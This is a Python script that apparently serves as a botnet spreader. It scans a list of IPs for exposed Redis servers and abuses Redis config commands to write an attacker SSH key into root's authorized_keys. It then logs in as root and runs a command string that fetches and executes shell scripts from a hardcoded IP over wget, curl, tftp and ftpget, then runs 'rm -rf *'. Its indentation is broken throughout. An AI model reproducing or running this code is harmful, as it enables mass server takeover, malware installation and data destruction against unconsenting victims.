#! python !#

import random, socket, threading, socket, sys, paramiko

procIP = []
suc = 0
command_to_send = 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.131/sensi.sh; curl -O http://185.244.25.131/sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp 185.244.25.131 -c get sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp -r sensi2.sh -g 185.244.25.131; chmod 777 sensi2.sh; sh sensi2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.244.25.131 sensi1.sh sensi1.sh; sh sensi1.sh; rm -rf sensi.sh sensi.sh sensi2.sh sensi1.sh; rm -rf *'

def main():
    if len(sys.argv) < 3:
    sys.exit("Usage: <ip_list> <ip_output_file>\n")
ipList = getLinesList(sys.argv[1])
ipOutput = sys.argv[2]
keyFile = file("/root/.ssh/id_rsa.pub", 'r').read().strip()
threads = []
for x in xrange(1, 500):
    print "Appending thread " + str(x)
t = threading.Thread(target = worker, args = (ipOutput, keyFile, ipList))
threads.append(t)
for x in threads:
    x.start()
for x in threads:
    x.join()

def worker(ipOutput, keyFile, ipList):
    try:
    global suc
global procIP
while len(ipList) != len(procIP):
    ip = random.choice(ipList)
if ip not in procIP:
    ipList.remove(ip)
procIP.append(ip)
try:
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
sock.setblocking(False)
sock.settimeout(3)
sock.connect((ip, 6379))
sock.settimeout(None)
sock.send("config set dir /root/.ssh/\n")
buf = sock.recv(4)
if buf.strip() == "+OK":
    print "[+] Good IP " + ip
sock.send("set qwe \"\\n\\n" + keyFile + "\\n\\n\\n\"\nconfig set dbfilename \"authorized_keys\"\nsave\n")
file_h = open('good.txt', 'a')
file_h.write(ip + "\n")
file_h.close()
suc += 1
sock.close()# ssh auto infector
ssh_port = 22
user = 'root'
ssh = paramiko.Transport((ip, ssh_port))
auth_key = paramiko.RSAKey.from_private_key_file("/root/.ssh/id_rsa")
ssh.connect(username = user, pkey = auth_key)
session = ssh.open_channel()
session.exec_command(command_to_send)
time.sleep(10)
ssh.close()
else :
    sock.close()
print "[%s/%s] Bad IP --> %s" % (str(suc), str(len(ipList)), ip)
except Exception, e:
    print "[%s/%s] Bad IP (can't connect at all) --> %s" % (str(suc), str(len(ipList)), ip)
except Exception, e:
    raise e

def getLinesList(fileLoc):
    buf = []
with file(fileLoc, 'r') as f:
    for line in f:
    buf.append(line)
return buf

def writeSuc(file_name, content):
    try:
    if content not in file(file_name, 'r'):
    with file(file_name, 'a+') as f:
    f.write(content)
except Exception, e:
    pass
if __name__ == '__main__':
    main()